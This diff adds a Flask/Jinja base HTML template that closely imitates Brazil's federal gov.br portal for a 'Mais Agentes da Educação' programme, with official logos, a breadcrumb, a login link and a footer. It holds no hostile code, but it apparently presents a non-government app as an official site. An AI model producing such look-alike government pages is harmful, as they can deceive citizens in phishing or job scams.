@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}Mais Agentes da Educação - gov.br{% endblock %}</title>
+    
+    <!-- External CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
+    
+    <!-- SEO and Meta Tags -->
+    <meta name="description" content="{% block description %}Programa Nacional de Agentes da Educação - Governo Federal{% endblock %}">
+    <meta name="keywords" content="educação, governo federal, agentes educação, PNAE, vagas públicas">
+    <meta name="author" content="Governo Federal do Brasil">
+    
+    <!-- Open Graph -->
+    <meta property="og:title" content="{% block og_title %}Mais Agentes da Educação - gov.br{% endblock %}">
+    <meta property="og:description" content="{% block og_description %}Programa Nacional de Agentes da Educação do Governo Federal{% endblock %}">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="{{ request.url }}">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
+</head>
+<body class="bg-white">
+    <!-- Header -->
+    <header class="header-govbr">
+        <div class="flex justify-between items-center px-4 py-3">
+            <div class="flex items-center">
+                <a href="{{ url_for('index') }}" class="gov-logo">
+                    <span class="text-blue-800 font-bold text-2xl">g</span>
+                    <span class="text-yellow-500 font-bold text-2xl">o</span>
+                    <span class="text-blue-500 font-bold text-2xl">v</span>
+                    <span class="text-yellow-500 font-bold text-2xl">.</span>
+                    <span class="text-blue-800 font-bold text-2xl">b</span>
+                    <span class="text-red-500 font-bold text-2xl">r</span>
+                </a>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="menu-btn" aria-label="Menu">
+                    <i class="fas fa-ellipsis-v text-blue-800 mx-3"></i>
+                </button>
+                <div class="w-px h-6 bg-blue-800 mx-3"></div>
+                <button class="header-btn" id="accessibility-btn" aria-label="Acessibilidade">
+                    <i class="fas fa-palette text-blue-800 mx-3"></i>
+                </button>
+                <div class="half-circle mx-3"></div>
+                <button class="header-btn" id="apps-btn" aria-label="Aplicativos">
+                    <i class="fas fa-th text-blue-800 mx-3"></i>
+                </button>
+                <a href="{{ url_for('login') }}" class="bg-blue-600 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-700 transition-colors">
+                    <i class="fas fa-user mr-2"></i>
+                    Entrar
+                </a>
+            </div>
+        </div>
+
+        <!-- Title Bar -->
+        <div class="flex justify-between items-center px-4 py-2 border-b border-gray-200">
+            <div class="flex items-center">
+                <button class="header-btn" id="sidebar-toggle" aria-label="Menu lateral">
+                    <i class="fas fa-bars text-blue-800 mr-3"></i>
+                </button>
+                <span class="text-gray-700">Fundo Nacional de Desenvolvimento da Educação</span>
+            </div>
+            <div class="flex items-center">
+                <button class="header-btn" id="voice-search-btn" aria-label="Busca por voz">
+                    <i class="fas fa-microphone text-blue-800 mx-2"></i>
+                </button>
+                <button class="header-btn" id="search-btn" aria-label="Pesquisar">
+                    <i class="fas fa-search text-blue-800 mx-2"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- Breadcrumb -->
+        <nav class="breadcrumb-nav flex items-center px-4 py-3 text-sm overflow-x-auto whitespace-nowrap" aria-label="Navegação estrutural">
+            <a href="{{ url_for('index') }}" class="text-blue-800 hover:text-blue-600">
+                <i class="fas fa-home"></i>
+            </a>
+            <span class="mx-2 text-gray-500">></span>
+            <a href="{{ url_for('acesso_informacao') }}" class="text-blue-600 hover:text-blue-800">Acesso à Informação</a>
+            <span class="mx-2 text-gray-500">></span>
+            <a href="{{ url_for('acoes_programas') }}" class="text-blue-600 hover:text-blue-800">Ações e Programas</a>
+            <span class="mx-2 text-gray-500">></span>
+            <a href="{{ url_for('programas') }}" class="text-blue-600 hover:text-blue-800">Programas</a>
+            <span class="mx-2 text-gray-500">></span>
+            <a href="{{ url_for('bolsas_auxilios') }}" class="text-blue-600 hover:text-blue-800">Bolsas e Auxílios</a>
+            <span class="mx-2 text-gray-500">></span>
+            <a href="{{ url_for('lista_programas') }}" class="text-blue-600 hover:text-blue-800">Lista de Programas</a>
+            <span class="mx-2 text-gray-500">></span>
+            <span class="text-gray-700">Mais Agentes da Educação</span>
+        </nav>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        {% block content %}{% endblock %}
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#0a1f44] text-white">
+        <div class="container mx-auto px-6 py-4">
+            <!-- Logo -->
+            <div class="py-6">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
+                     alt="Government of Brazil logo showing gov.br in white text" 
+                     class="w-40">
+            </div>
+
+            <!-- Divider -->
+            <div class="border-t border-gray-600"></div>
+
+            <!-- Navigation Menu -->
+            <nav aria-label="Menu principal do rodapé">
+                <ul>
+                    <li class="py-3">
+                        <a href="#" class="text-sm hover:text-gray-300">SUS</a>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">ASSUNTOS</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Assuntos">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">VACINAÇÃO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Vacinação">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">COMPOSIÇÃO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Composição">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="{{ url_for('acesso_informacao') }}" class="text-sm hover:text-gray-300">ACESSO À INFORMAÇÃO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Acesso à Informação">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">CENTRAIS DE CONTEÚDO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Centrais de Conteúdo">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">CANAIS DE ATENDIMENTO</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Canais de Atendimento">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600 py-3 flex justify-between items-center">
+                        <a href="#" class="text-sm hover:text-gray-300">CAMPANHAS DA SAÚDE</a>
+                        <button class="footer-expand-btn" aria-label="Expandir seção Campanhas da Saúde">
+                            <i class="fas fa-chevron-down text-xs"></i>
+                        </button>
+                    </li>
+                    <li class="border-t border-gray-600"></li>
+                </ul>
+            </nav>
+
+            <!-- Cookie Settings -->
+            <div class="mt-6 flex items-center">
+                <button id="cookie-settings" class="flex items-center hover:text-gray-300" aria-label="Redefinir configurações de cookies">
+                    <i class="fas fa-cookie-bite text-lg mr-2"></i>
+                    <span class="text-sm">Redefinir Cookies</span>
+                </button>
+            </div>
+
+            <!-- Social Networks -->
+            <div class="redes-e-logos mt-8">
+                <div class="redes-sociais">
+                    <div class="titulo text-sm font-bold mb-4">Redes sociais</div>
+                    <ul class="portal-redes">
+                        <li class="portalredes-youtube portalredes-item">
+                            <a href="#" aria-label="YouTube" class="social-link">
+                                <i class="fab fa-youtube social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-facebook portalredes-item">
+                            <a href="#" aria-label="Facebook" class="social-link">
+                                <i class="fab fa-facebook-f social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-twitter portalredes-item">
+                            <a href="#" aria-label="Twitter" class="social-link">
+                                <i class="fab fa-twitter social-icon"></i>
+                            </a>
+                        </li>
+                        <li class="portalredes-instagram portalredes-item">
+                            <a href="#" aria-label="Instagram" class="social-link">
+                                <i class="fab fa-instagram social-icon"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Search Modal -->
+    <div id="search-modal" class="search-modal hidden">
+        <div class="search-modal-content">
+            <div class="search-modal-header">
+                <h3>Pesquisar</h3>
+                <button id="close-search-modal" aria-label="Fechar pesquisa">
+                    <i class="fas fa-times"></i>
+                </button>
+            </div>
+            <div class="search-modal-body">
+                <form id="search-form">
+                    <input type="text" id="search-input" placeholder="Digite sua pesquisa..." aria-label="Campo de pesquisa">
+                    <button type="submit" aria-label="Pesquisar">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
